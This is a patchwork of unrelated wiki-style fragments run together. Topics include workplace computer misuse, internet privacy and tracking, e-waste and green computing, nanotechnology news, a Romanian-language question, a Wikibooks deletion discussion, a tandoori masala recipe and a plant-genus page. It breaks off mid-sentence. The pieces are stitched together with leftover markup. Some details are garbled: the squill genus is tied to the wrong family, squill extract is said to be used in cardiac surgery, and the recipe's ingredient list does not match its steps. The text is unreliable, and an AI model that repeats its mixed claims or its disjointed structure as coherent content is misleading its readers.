One word that has been adopted to describe wasting of time on computer issues or problems is “fussing,” which maybe defined as “to trouble or worry over trifles …, to get into or be in a state of … useless activity, … to vex with unimportant matters” (http://www.thefreedictionary.com/fussing Retrieved Nov 27, 2006). While some of the aforementioned uses of time (e.g., waiting for computer to load) simply nibble away at your day and seem appropriately entitled as “fussing,” others can consume an inordinate amount of one’s workday. In these cases, they can truly become the “gigantic time sink” (Williams &amp; Sawyer, p. 489) or “great campus goof-off machine” (Nate Stulman in Williams &amp; Sawyer, p. 489).

Therefore, justice is not necessarily served in using the term “fussing.” There maybe no crime committed in the truest sense of the word because no criminal intent is involved (i.e at least by the employee), but one could just as easily view it as a crime – especially from the employer’s viewpoint. Technology has robbed the workplace of it productivity!

ii) The Real Time Crime in the Workplace

An estimated “… 8.3 hours a week …” are involved in “… non-work-related …” website “… peeking …” (Williams &amp; Sawyer, p. 477). Add into this mixture the time spent employees may spend doing such things as downloading music, playing games and on-line shopping (Williams &amp; Sawyer, p. 472). These become the real crimes against the employer! The ultimate, however, is possibly conducting one’s own sideline business while on the employer’s time and using his/her company’s resources. There’s multi-tasking and then there’s lost productivity and revenues (also expenses) for the other party involved in this. Wow! What better business scheme than to make money twice over – with your own business (without overhead costs) and through the “unearned” company pay cheque?

c) The “Inside Job” -- Computer Security in the Workplace

To counter some of this lost revenue and productivity, there has been an increased need and demand for surveillance techniques to monitor employees. Employers have resorted to many means, even to the point of creating separate computer security departments or divisions to deal with both the internal and external threats.

In light of the statistics available or opinions espoused, there is no wonder such measures have had to be taken. For example, one survey discovered that in the opinion of some security personnel, “… the greatest threat to their company’s technology infrastructure as a result of cyberattacks were current employees (53%), former employees (10%), and nonemployees (28%)” (Williams &amp; Sawyer, p. 475). In other cases, employees may “… use information technology for personal profit or to steal hardware or information to sell. They may also use it to seek revenge for real or imaged wrongs …” and, indeed, one report found that “… the disgruntled employee is a principal source of computer crime” (Williams &amp; Sawyer, p. 476).

d) A Final Note

So, where’s the criminal? He or she maybe seated right outside the boss's door or at the next desk. Workplace crimes can come in many forms and with many different faces, but the obvious from this brief overview is --- the technological advances in the workplace have put the employer at risk of being robbed of time, energy and resources – all in the name of productivity!

      <text xml:space="preserve">Personal information is confidential for people, and it is the right that not to reveal the information about themselves.However, since computer technology advanced, it is getting harder and harder to prevent privacy from being tracked. Many people are worried about losing their right to privacy and losing control of the personal information being collected by others. There are some ways to threaten your privacy that we have to concern.

===Fill the form, please!===

Sometimes, people will receive applications for credit cards or invitations to join clubs, etc.
By writing down your personal information, the company can get your own information easily. Once you are in the database, your name seems easier to be revealed to other people.

===Snooping!===

If you want to get a job, usually you have to make your own resume in order to attract owners to hire you. Besides dropping off your resume in person, some people will post it on an internet job board. Therefore, your personal information, background, education, marriage status are available to everyone! It is one of the easy ways for snooping to get people's personal information.

===A call can spy you, too!===

Have you ever got a call from people who wants to spy your personal information? Now, this action is getting more and more. By pretending some roles, such as surveyor or salesman, it is easily for them to get the information that they want if you out of precaution! So, before you say it out, don't feel embarrassed, check if they have authority to do that. It is the way to protect yourself, and your privacy.

===Internet Tracking===

100s of Internet companies are &quot;tracking&quot; an end computer user's every move while on the Internet. These companies consist of Internet search engines like Google, advertising firms, and Internet &quot;traffic-logging&quot; sites. The sole purpose for these companies to &quot;track your movements&quot; is so, that they can collect data about your personal interests based upon data from your Internet searches. These &quot;data collecting&quot; organizations place a &quot;cookie&quot; on information that the end user has glanced at. 

Wikipedia's definition of a cookie is as follows, &quot;a cookie, also known as an HTTP cookie, web cookie, or browser cookie, is used for an origin website to send state information to a user's browser and for the browser to return the state information to the origin site.[1] The state information can be used for authentication, identification of a user session, user's preferences, shopping cart contents, or anything else that can be accomplished through storing text data on the user's computer. Cookies cannot be programmed, cannot carry viruses, and cannot install malware on the host computer.[2] However, they can be used by spyware to track user's browsing activities—a major privacy concern that prompted European and US law makers to take action.[3][4] Cookie data can also be illicitly disclosed by hackers to gain access to a victim's web account.&quot;

So, once the data is captured and collected, the information is then matched to ads that are then posted while you are still on the Internet. These ads are specifically chosen based on your &quot;search history&quot;. These ads are shown in hopes that you, the consumer, will then be interested in the websites and or products being shown and will ultimately purchase those products.

While the end user's name is not is not attached to the information that is gathered; it may still feel like an invasion of privacy. Recently, there has been discussion about &quot;Do Not Track&quot; tools and what orders websites will have to respect in regards to end users notifying them that they &quot;do not want to be tracked&quot;. The Digital Advertising Alliance (DAA), the Federal Trade Commission, W3C, the Internet Advertising Bureau (also part of the DAA), and privacy researchers at academic institutions are all involved. In November 2011, the DAA put out a new set of principles that contain some good ideas like the prohibition of &quot;collection, use or transfer of Internet surfing data across Websites for determination of a consumer's eligibility for employment, credit standing, healthcare treatment and insurance.&quot; 

In February 2012, the White House seemed to side with privacy advocates who want to limit collection, not just uses. Its Consumer Privacy Bill of Rights pushes companies to allow users to &quot;exercise control over what personal data companies collect from them and how they use it.&quot; The DAA heralded its own participation in the White House process, though even it noted this is the beginning of a long journey. 

[[File:Google_wordmark.svg‎|150px|right|]]
Recently, Google has adapted new policy that incorporates the sharing of your information accross their platforms.  Which means that any You Tube video, email through Gmail and so on can be used to target you for advertisement and other services. This has made privacy advocates question the Google's intentions and even the legality of this new policy.  The biggest issue with the change has been the fact that if you use any of Google's products, you will not have the option to opt out of the new policy.

==Privacy==
Everyone is or should be concerned about Internet privacy.
There are several ways to protect individuals and their finances over the Internet. Certain measures of safety may be taken such as only go to trusted sites, read the sites privacy policy, and don’t use the auto populate on public computers and finally use common sense.
There are also many government groups that protect our privacy and be safe on the Internet. The Federal Trade Commission (FTC) stresses that protecting individual’s social security number while dealing with things on the Internet is very important. Pay attention to the trash and e-mails that are received from the Internet. Hackers can easily access these important e-mails. Make difficult passwords so not just anyone can easily access information. Verify the sources to make sure they are safe and okay to give personal information. The Internet Crime Complaint Center works in a partnership with the Federal Bureau of Investigation (FBI) and the National White Collar Crime Center (NW3C) to help and receive criminal complaints related to the Internet. 
Posting things on the Internet can be harmful to individuals. The information posted on the Internet is permanent. This includes comments written on blogs, pictures, and Internet sites, such as Facebook and Twitter. It is absorbed into cyberspace and once it is posted, anyone can find it and read it. This action can come back and hurt people in the long run when applying for jobs or having someone finds person information. Another way of protecting your privacy is to Never submit a credit card number or other highly sensitive personal information without first making sure your connection is secure (encrypted). In Netscape, look for an closed lock (Windows) or unbroken key (Mac) icon at the bottom of the browser window. In Internet Explorer, look for a closed lock icon at the bottom (Windows) or near the top (Mac) of the browser window.In any browser, look at the URL (Web address) line - a secure connection will begin &quot;https://&quot;isntead of &quot;http://&quot;. If you are at page that asks for such information but shows &quot;http://&quot; try adding the &quot;s&quot; yourself and hitting enter to reload the page (for Netscape or IE; in another browser, use whatever method is required by your browser to reload the page at the new URL). If you get an error message that the page or site does not exist, this probably means that the company is so clueless - and careless with your information and your money - that they don't even have Web security. Take your business elsewhere.

==Privacy Laws==
'''The Computer Matching and Privacy Protection Act 1988'''

Describing the rule in which computer matching associating federal agencies could be act and by putting protections for personal applying for and receiving benefits.

'''Video Privacy Protection Act'''

It was created in 1988, which provides on of the biggest consumer privacy.

'''Children's Online Privacy Protection Act (COPPA)'''

==Tracking Protection==

Email can be tracked without protection. 

You can send ads, images, web links, etc and think what you send is private but sadly it is not, unless you have protection.  A third party can receive your information without your knowledge, you need tracking protection.
Below is a list of the top ten tracking protection sites available to protect your privacy.  The protection gives you a choice of what third-party sites can track you online.  You have the option to block the content from websites that may invade your privacy:

1.	Abine's Kids and Teens Tracking Protection List 
2.	Abine's Standard Tracking Protection List 
3.	EasyPrivacy Tracking Protection List 
4.	PrivacyChoice TPL - all companies 
5.	PrivacyChoice Tracking Protection List - Block companies without NAI oversight 
6.	TRUSTe Tracking Protection List
8.	EasyList Standard Tracking Protection List

There was a second defn for submodule suggested. Really, both definitions were the same, but the second one expressed the idea better by enumerating the conditions. I've merged these two. Also, I've ommited that submodules must be non empty, since this is implied by their being subgroups of the containing module. Does this merit, comment in the text? Methinks not.

      <text xml:space="preserve">A typical computer has many negative influences on the environment, anywhere from the manufacturing of computers to the distribution of computers. This has caused many questions and awareness among individuals who are concerned with the negative influences on the environment; which may cause hurdles for the new generations to come.  There are various ways one should manufacture, buy, use and dispose computers so the negative impact on the environment can be reduced.

'''E-trash/E-waste'''

E-trash/e-waste is any refuse created by discarded electronic devices and components as well as substances involved in their manufacture or use. E-trash is particularly significant because disposal of electronic items results in toxic waste that is products containing dangerous metals like lead, cadmium and mercury which can contaminate air and water when they are dumped. In a personal computer, for example, there may be lead in the cathode ray tube (CRT) and soldering compound, mercury in switches and housing, phosphor to the front of a CRT screen, mercury powder in Flat screen backlights and cobalt in steel components. 

[[File:Ewaste.jpg|thumb|E-trash]]
Concern about the environmental issues surrounding e-trash has led governments across the world to implement laws prohibiting its disposal in landfills and issue directives on recycling. In the European Union, for instance, some responsibility was placed back on the manufacturer in the form of directives which make them financially or physically responsible for their equipment at the end of its life (and thereby provide a competitive incentive for companies to design “greener” products). In the United States initiatives mostly come from the private sector, such as eBay’s Rethink project. 


According to the article, &lt;u&gt;&quot;Electronic Waste: Where does it go and what happens to it&quot;,&lt;/u&gt;  a January 2011 NPR story shows us that companies might not be as honest about what they are doing with your old electronics. More often than not these items are shipped outside of the United States, moving the toxic waste dump from our shores to developing countries, according to Basel Action Network executive director Jim Puckett. The non-profit organization focuses on protecting the environment from dangerous waste.
 
Pucket goes on to say, '“The dirty little secret is that when you take [your electronic waste] to a recycler, instead of throwing it in a trashcan, about 80 percent of that material, very quickly, finds itself on a container ship going to a country like China, Nigeria, India, Vietnam, Pakistan — where very dirty things happen to it,”&quot; Puckett said to NPR.
 
While recyclers do make money selling metal scraps, such as gold and liquid solder, it is cheaper to have the hard labor of pulling apart and melting down pieces done outside the country even if that means the useless scraps and other hazardous materials will liter that area. For example, 60 Minutes went to one of these illegal electronics stripping shops in Guiyu, China, which employed workers for $8 a day. Despite the fumes that made the workers cough and other health hazards, the workers said they opted to work at recycling factories because it was one of the only jobs in this region that paid a living wage.
 
The environmental damage on the area because of all the toxic materials has left a permanent scar. Scientists who have examined Guiyu have determined that because of the waste, the location has the highest levels of cancer-causing dioxins in the world. Pregnant women are six times more likely to suffer a miscarriage, and seven out of ten kids have too much lead in their blood. Many of the devices broken down in the town came from other countries including the US, who in 2008 according to Natural Resources Defense Council Allen Hershkowitz tossed out 130,000 computers each day and dispose of over 100 million cell phones each year.
 
 
Basel Action Network suggests taking an extra step and using one of the e-Stewards, certified recyclers that do not ship their electronic waste to be disposed of in different countries. It may narrow down the choices of where you can dump your old computer or cell phone, but the extra effort is worth it.

==Disposal/Recycling==
Disposal/recycling is a technique used to discard/reuse any unwanted merchandise, in this case computer technology.

There are several steps one should take whether the computer equipment is being disposed of or if it is being donated. 

* Remove/Reformat Hard Drive
Deleted files may be recovered from the hard drive and sometimes even a reformatted hard drive.

* Remove Company Insignia
All company information should be removed to prevent hackers from being able to identify where recovered information may have come from.

* Put it in Writing
Have the recipient of the used equipment sign that they are accepting responsibility for proper disposal. 

* Get it in Writing
If the used equipment is brought to a recycling company, request written documentation that they are taking responsibility for proper disposal. If the documentation cannot be provided, this would be a sign that the recycling company is not legitimate.

===Facts and Figures===
*&quot;Studies estimate that 315 - 600 million desktop and laptop computers in the U.S. will soon be obsolete... [and] contain a total of more than 1.2 billion pounds of lead.  About 40% of the heavy metals in landfills, including lead, mercury, and cadmium, come from electronic equipment discards.&quot;

Silicon Valley Toxics Coalition, Fifth Annual Computer Report Card (2004)

*&quot;Informed recycling industry sources estimate that between 50 to 80 percent of the wastes collected for recycling are not recycled domestically at all, but very quickly placed on container ships bound for destinations like China.&quot;

BAN &amp; SVTC, Exporting Harm (2002)

*&quot;Producing the average 55-pound desktop computer and monitor requires 530 pounds of fossil fuels, 50 pounds of chemicals, and 3,330 pounds of water (due to the repeated rinsing necessary).  These amounts are roughly the weight of a sport utility vehicle or 1.8 metric tons.&quot;

Jim Lynch, Islands in the Wastestream, (CompuMentor: 2004), p. 1

*&quot;Where once consumers purchased a stereo console or television set with the expectation that it would last for a decade or more... consumers now rarely take broken electronics to a repair shop, as replacement is now often easier and cheaper than repair.  The average lifespan of a computer has shrunk from four or five years to two years.&quot;

BAN &amp; SVTC, Exporting Harm (2002)

*&quot;Data from single-day recycling collection events has revealed that more than 50% of turned-in computers are in good working order, but they are discarded nonetheless to make way for the latest technology.&quot;

BAN &amp; SVTC, Exporting Harm (2002)

*&quot;Compumentor research estimates public school need for computers at ... 9 million nationally.  This need has been dramatically affected by recent state and local budget cuts.&quot;

Jim Lynch, Islands in the Wastestream, (CompuMentor: 2004), p. 1

*&quot;A significant share of the environmental impacts incurred in the computer life cycle is in the production phase.  For a desktop computer used at home, for example, the energy needed to produce the machine is four times more than that needed to power it during the use phase.  The energy consumed to produce a refrigerator is only about one-eighth the electricity used to run it.&quot;

Kuer &amp; Williams, Computers &amp; The Environment (Kluwer: 2003), p. 4

*&quot;Over each computer's life cycle, reselling or upgrading computers saves 5 to 20 more energy than recycling.&quot;

Jim Lynch, Islands in the Wastestream, (CompuMentor: 2004), p. 1

*&quot;Research reveals that reselling or upgrading one in ten computers reduces total energy use by 8.6 percent and 5.2 percent, respectively, by reducing demand for new machines.  In contrast, recycling the materials from one in ten computers only saves 0.43 percent by replacing demand for virgin materials.&quot;

Kuer &amp; Williams, Computers &amp; The Environment (Kluwer: 2003), p. 9

*&quot;One [obstacle to the re-use of computer equipment] is the issue of the transfer of software licenses for pre-installed software to the purchaser of a used PC.  Although a software license is, in principle, transferable to the person buying a used PC, it is often not simpl[e] because the mechanics of the transfer are needlessly awkward.&quot;

Kuer &amp; Williams, Computers &amp; The Environment (Kluwer: 2003), p. 9

*&quot;The E-waste recyling and disposal operations found in China, India, and Pakistan are extremely polluting and likely to be very damaging to human health.  Examples include open burning of plastic waste, exposure to toxic solders, river dumping of acids, and widspread general dumping.&quot;

BAN &amp; SVTC, Exporting Harm (2002)

*&quot;Approximately 40% of US families do not have Internet-capable computers.&quot;

Jim Lynch, Islands in the Wastestream, (CompuMentor: 2004), p. 1

*&quot;According to a Carnegie Mellon University study, by 2005 about 680 million PCs will have been sold in the United States since 1981.&quot;

Kuer &amp; Williams, Computers &amp; The Environment (Kluwer: 2003), pp 2 - 3

*&quot;...less than a third of the world's population has ever even made a telephone call.&quot;

Kuer &amp; Williams, Computers &amp; The Environment (Kluwer: 2003), p. 22

===Advantages===
* Refurbished technology given to the less fortunate.
* Environmentally friendly as less computer dumping occurs.

===Disadvantages===
*Ignorant disposal may cause further damage to the environment as harmful elements may be accidentally exposed.
*Cost involved may discourage correct disposal.

===Monitor Recycling - What Happens Now===
[[File:Recycling Computers.jpg|thumb|Monitors Ready for Transport]]
So, you’ve decided to do the right thing and take your monitor/computer to a recycling center.  What happens after you drop off your equipment?  First, many companies or municipalities will separate the equipment into “valuable” equipment (that can refurbished and then either sold or donated) and “non-valuable” equipment (equipment that is too old or in too much disrepair to be salvaged).  The monitor is then dis-assembled and the various materials are separated into categories.  Glass, plastic, and circuit boards are all collected.  Harmful metals are removed from the circuit boards, which are then crushed, melted down, and sold to a manufacturer.

==The Cost of Saving Money==
[[File:Electronic waste.jpg|100px|thumb|left]]
Recycling is a good way to reuse raw materials in products, but electronic waste contains harmful chemicals that can harm people and the environment.  Developed countries have regulations which control the handling of e-waste, which takes place at specially developed facilities, under controlled conditions.  This type of recycling can be expensive, therefore, many developed countries started exporting e-waste to developing countries where recycling is much cheaper.  However, these countries do not have laws in place to protect the workers or the environment, which means workers are exposed to lead and other hazardous materials, along with the hazardous effects on the environment, which can potentially harm everyone.
==Green Computing==
[[File:Energy Star logo.svg|100px|thumb|left|Energy Star Program]]
Green computing refers to the use of computers in an environmentally friendly way.  With the increased use of technology, there is a need to develop energy-saving devices.  The US Department of Energy and the Environmental Protection Agency in 1992 created the Energy Star Program.  The purpose of the Energy Star Program is to encourage the development of energy-saving devices.  Hardware that contains the Energy Star Logo exceeds the minimum federal standards for reduced energy consumption.  In other words, green computing involves reducing the electricity and environmental waste while using a computer.  Hardware devices should comply with the Energy Star program guidelines.  It is encouraged that manufactures create energy-efficient devices.        







'''Some of the “Green Computing Suggestions” include-'''*	
*       Use computers and devices that comply with the Energy Star program
*	Do not leave the computer running overnight
*	Turn off the monitor, printer, and other devices when not in use
*	Use LCD monitors instead of CRT monitors
*	Use paperless methods to communicate
*	Recycle paper
*	Buy recycled paper
*	Recycle toner cartridges
*	Recycle old computers, printers and other devices
*	Telecommute to save to save gas
*	Use video conferencing and VoIP for meeting

&lt;u&gt;New Discoveries in Nanotechnology&lt;/u&gt;&lt;br&gt;  

Nanotechnology is now a wannabe superhero’s best asset.  Previously, an optical cloak could hide an object on a wall by changing the angle that light bounced off the object and thus distorting what a person saw.  An optical cloak could only hide an object not on a surface by bending light completely around the object.  This was done with synthetic metamaterials which are smaller than the actual wavelength of light they are reflecting.  Previously, this had only been accomplished at specific wavelengths but new discoveries have allowed this to be possible with all wavelengths.  Utilizing holes between 60 and 65 nanometers etched into thin layers of silicon nitride deposited on porous glass, it is possible to bend light completely around an object (potentially a superhero or more realistically an armored tank entering into battle) and make that object appear invisible.

[[File:RNA-comparedto-DNA thymineAndUracilCorrected.png|thumb|RNA vs. DNA]]


DARPA, an agency of the United States Department of Defense, is proposing to stop spending money on researching new antibiotics and to instead focus that money on developing new and innovative ways to utilize nanoparticles to fight infections.   DARPA is currently seeking new proposals for how to utilize the small interfering RNA (similar to DNA) and collectively known as siRNA.  siRNA is a macromolecule that can be programed with a specific genetic code and then that molecule will seek out the same genetic code within cells in the human body and ultimately destroy those cells.  A siRNA could be programmed with the same genetic code as a particular strain of bacteria and theoretically the siRNA would scour the human body searching for that bacteria and destroy it with relatively no side effects.  Unlike antibiotics, the bacteria cannot grow resistant and the siRNA can be programmed rather rapidly to destroy an extensive list of different harmful cells.

==And you?==
I have Pimsleur's Romanian, and they say, &quot;Şi Dumneavoastră?&quot; to mean &quot;and you?&quot;. Can someone please clarify which is the correct way to say it in Romanian? And Lesson 2 of the Wikibook says that the D in Dumneavoastră must be capitalized. [[User:Entbark|Entbark]] 03:47, 21 March 2007 (UTC)

This is erik212. I speak romanian, and I can say that it sounds correct, but I'm not sure about the spelling.

Which one is more correct? Or can you give situations in which one or the other would be used? [[User:Entbark|Entbark]] 13:31, 13 July 2007 (UTC)</text>

Seems to have been an abandon Wikipedia import:
* Doesn't appear to be annotated in any way
* Consist of links and list of pages to refer to.
* Not sure it has any educational value.
--&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 17:28, 23 February 2007 (UTC)

* '''Delete''': For reasons mentioned above, though this has only been abandoned for two months it appears that nothing has been done to it at all in that time (except for cleanups by a few regulars), not like someone has been working on it but slowly. I think it might be useful as a stretch in some class on cultural outlets but its just that, a stretch, and such a class would probably only use, say, one annotated Peanuts and then move on to other things. [[User:Mattb112885|Mattb112885]] 17:43, 23 February 2007 (UTC)
* '''Keep''': Peanuts has considerable cultural signifigance... this annotation is explaining cultural references that have since become anachronistic. I'll switch the links to w: for now. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 20:07, 24 February 2007 (UTC)
* '''Keep''': I agree with SBJohnny.  Peanuts has potential and there is substantial work there already.  Plus Peanuts is great! [[User:Xania|Xania]] [[Image:Flag_of_Poland_2.svg|15px]][[User talk:Xania|&lt;sup&gt;talk&lt;/sup&gt;]] 21:32, 24 February 2007 (UTC)
:* '''Comment''' Would this not be more appropriate for Wikisource than? I believe Wikisource is meant for this sort of text. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 16:13, 25 February 2007 (UTC)
::I'm not really sure about this point.  Annotated texts do seem to be on both Wikibooks and Wikisource, and this is admittedly one of the substantial grey areas between both projects.  Since there are so many other things that clearly differentiate both projects, this one area really isn't much of a problem so far as turf wars don't seem to be a problem either and both Wikisource and Wikibooks are about the same size in terms of number of participants.  If I had to make a distinction for where annotated texts should go, I would suggest that Wikisource keep the annotated texts of sources that are available under the GFDL (or PD-old) and Wikibooks keep those that are for content under copyright.  Under this philosophy, perhaps the best course is '''Keep'''.  --[[User:Robert Horning|Rob Horning]] 20:11, 28 February 2007 (UTC)
::: The distinction I was thinking of is that Wikisource has annotated texts that are not necessarily educational materials used in a classroom, I think, while annotated texts on Wikibooks should be educational materials used in a classroom. I'm not sure where copyright or licenses fits into the distinction between both projects, but I think both use the GFDL. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 13:18, 3 March 2007 (UTC)
::::I was not trying to say that the content here on Wikibooks ought to be something other than the GFDL.  Of course it should be.  The point I was trying to make is that if the &quot;source content&quot; is available under the GFDL or is public domain, that text itself should also be on Wikisource anyway, and the annotations should be directly tied to the content.  There really doesn't seem to be a point to seperate the annotations on one project and the source text itself on another one.  If the source content is not available under the GFDL, the nature of the annotations will therefore be somewhat different and there isn't a reason for Wikisource to host that sort of content.  Yet Wikibooks certainly would be a place to host notes related to another book that may even be commercially published elsewhere.  The annotations, of course, would always be available under the GFDL.  --[[User:Robert Horning|Rob Horning]] 19:59, 6 March 2007 (UTC)
:::::Perhaps the distinction should be Wikibook is for an original book, created wholely at wikibooks, while Wikisource should be for textbooks that are already present at other medium, wikified. &lt;small&gt;—The preceding [[w:Wikipedia:Sign your posts on talk pages|unsigned]] comment was added by [[User:anonymous|anonymous]] ([[User talk:anonymous|talk]] • [[Special:Contributions/anonymous|contribs]]) {{{2|}}}.&lt;/small&gt;
::::::There are very few (I don't think any) textbooks at Wikisource, so it isn't completley a true statement here.  It is true that Wikibooks are completely new books.  But official policy even from the very beginning of this project has explicitly permitted annotated texts.  There are some books that Wikisource won't take, as in particular they won't take texts that are added by the original author (except under very rare circumstances).  This is to keep Wikisource from becoming a vanity publisher, just as we try to keep that happening here as well.  Only here on Wikibooks that is kept under control because we demand that all content which is added should also be editable and changeable.  That usually scares away those who would try to add their pet book project they have been working on for the past 10 years, which would normally go to a vanity press.  --[[User:Robert Horning|Rob Horning]] 03:41, 11 March 2007 (UTC)
*'''Keep'''. I'm going to say keep on this one, although it is hardly the &quot;model&quot; annotated text. What I worry about most is that this is less like an annotation, and more like a set of footnotes and errata. The bulleted list of factoids would do better to be reformatted as prose with critical discussion and analysis, in addition to the random tidbits of information. Since I am neither qualified, able, nor interested to make these changes, i will simply drop the issue. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 22:37, 28 February 2007 (UTC)
:* '''Comment''' - I share your same concerns and agree that its more like a set of footnotes and errata than annotation. That is part of why nominated it for deletion. I agree that it needs to be reformatted with critical discussion and analysis; I believe that is what is needed in order to be kept. It looks like it was imported from Wikipedia to me and I'm assuming someone requested it and intended to either do that or make it part of some pre-existing book, but hasn't done so. In fact as Mattb112885 said, it hasn't been worked on for two months and the only work that seems to have been done is some minor cleanup by regulars. My Wikisource suggestion is intended to be a possible compromise for a means of keeping the material, while moving it to perhaps a more appropriate wiki. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[Image:Yin yang.svg|12px]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 13:18, 3 March 2007 (UTC)

*'''Go ahead and delete'''.  I'm the creator of these annotations.  Given the general feeling that these don't belong anywhere in the Wiki universe, you have my permission to delete these.  I will be starting up a web page of my own that will contain them as well as future volumes.  I'll then put that under External Links.[[User:KXL|KXL]] 20:37, 9 March 2007 (UTC)
*:This is precisely why these VfD discussions can be so awful.  Here is a legitimate user who added content in good faith, trying to abide by the rules of the various projects, only to discover a byzantine series of policy pronouncements that they don't even want to bother dealing with.  I don't necessarily blame him for wanting to leave, given this kind of treatment.  --[[User:Robert Horning|Rob Horning]] 23:04, 9 March 2007 (UTC)
*::I second Robert's comments above. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 23:18, 9 March 2007 (UTC)
*'''Keep'''. When a user adds content in good faith, it belongs *somewhere* in the wiki universe. If it doesn't belong here, then please suggest some other wiki where it does belong. In this case, I feel the best place for this Peanuts annotation is Wikibooks, although I might be persuaded that Wikisource or http://bookshelved.org/ would also be an adequate location. --[[User:DavidCary|DavidCary]] 01:33, 13 March 2007 (UTC)

'''Tandoori masala''' is a mixture of spices specifically for use with a [[Cookbook:Tandoor|tandoor]], or clay oven, in traditional [[Cookbook:Cuisine of Pakistan|Pakistani]] and [[Cookbook:Cuisine of India|Indian]] Punjabi cooking. The specific spices vary somewhat from one region to another, but typically include fenugreek, cinnamon, cumin, coriander, garlic, ginger, etc.

The spices are ground to a fine powder in a coffee grinder or with a [[Cookbook:Mortar and Pestle|mortar and pestle]]. The masala is mixed with plain [[Cookbook:Yogurt|yogurt]], and meat (usually [[Cookbook:Chicken|chicken]]) is coated with the mixture, then slow-roasted in the tandoor. Chicken prepared in this fashion has a pink-coloured exterior and a savoury flavor.

The masala can be stored in airtight jars for up to 2 months, and is used in dishes like [[Cookbook:Tandoori masala|tandoori chicken]], [[Cookbook:Chicken Tikka Masala|chicken tikka masala]], [[Cookbook:Butter chicken|butter chicken]], etc., all of them mostly Punjabi dishes. It can be used with meat other than chicken, for example, in tandoori fish or paneer tikka.

Nowadays, packets of tandoori chicken masala are readily available at major Pakistani and Indian supermarkets, with varying tastes depending on the brand. This convenience has led to many Pakistanis and Indians buying the masala rather than making it at home.

== Ingredients ==
*1   tablespoon   fenugreek seeds
*1/2  teaspoon onion seeds
*1/2  teaspoon salt
*1  teaspoon hot masala
*1/2  teaspoon turmeric powder
*1/2  teaspoon curry powder
*1/2  teaspoon coriander powder
*1/2  teaspoon cumin powder
*1/4  teaspoon chili powder
*1 1/2  teaspoons paprika
*4  garlic cloves, peeled and cleaned
*2  tablespoons vegetable oil
*        fresh ginger (1 thumb-sized piece)
*2  jalapeño peppers (seeds and all)
*1  bunch fresh cilantro (washed, long stems cut off)
*1/4  cup lemon juice
*1  cup plain yogurt (an unthickened type of yogurt works best)

== Procedure ==
*Roast the fenugreek and onion seeds first by heating and tossing in a sauté pan for several minutes. Grind them together using a mortar and pestle or spice grinder.
*In a food processor, blend fenugreek and onion seeds with the salt, garam masala, turmeric, curry powder, coriander powder, cumin, chili powder, paprika, garlic, vegetable oil, ginger, jalapeños, cilantro and lemon juice until all the ingredients become a smooth paste.
*Spoon the mixture into a large mixing bowl and stir in the yogurt.
*Marinate meat or fish for eight hours (or bathe first in white distilled vinegar for shorter marination time). Tofu, vegetables or paneer can be tossed into the marinade just before grilling. Use the marinade to baste over the grill.

'''''Scilla''''' ('''squill''') is a genus of bulbous perennial herbs in the hyacinth family [[../Colchicaceae/]]. The 90-odd species are found in woodlands, subalpine meadows, and seashores across the Old World. Their flowers are usually blue, but white, pink, and purple types are known; most flower in early spring, but a few are autumn-flowering.

Several African species previously classified in ''Scilla'' have been removed to the genus ''[[../Ledebouria/]]''.  The best known of these is the common houseplant still sometimes known as ''Scilla violacea'' but now properly ''[[../Ledebouria socialis/]]''.

''Scilla peruviana'' is of interest for its name; it is a native of southwest Europe, ''not'' of Peru. The name results from when Carolus Linnaeus described the species in 1753; he was given specimens imported from Spain aboard a ship named ''Peru'', and was misled into thinking the specimens had come from that country. The rules of botanical naming do not allow a scientific name to be changed merely because it is potentially confusing.

==Description==
Bulbous perennials with strap-like, fark green leaves. Flowers held on small scapes above the foliage.

==Species==
Species include:
* ''[[../Scilla bifolia/]]''
* ''[[../Scilla peruviana/]]'' (Portuguese Squill, Corymbose Squill, or Cuban Lily)
* ''[[../Scilla scilloides/]]''
* ''[[../Scilla siberica/]]'' (Siberian Squill)
* ''[[../Scilla verna/]]'' (Spring Squill)

==Uses==
Some species are suitable for [[../Planting Lawn Bulbs|planting in lawns]], otherwise they are generally grown in ground covers.

Squill liquid extract, a preparation of powdered squill and ethanol, is used as an ingredient in cough medicines and cardiac surgery.

==Propagation==
By offset or seed.

==Pests and diseases==

*''[[../Uromyces muscari/]]''

Well, I got all of the tool icons on the page. Now I'm trying to create a navigator tool window. Your supposed to be able to click on the tool that you want to learn about and it takes you to the part of the page about it, but that isn't happening. The # symbol doesn't appear on the url.

      <text xml:space="preserve">You may be seeing problems like these in your application:


----


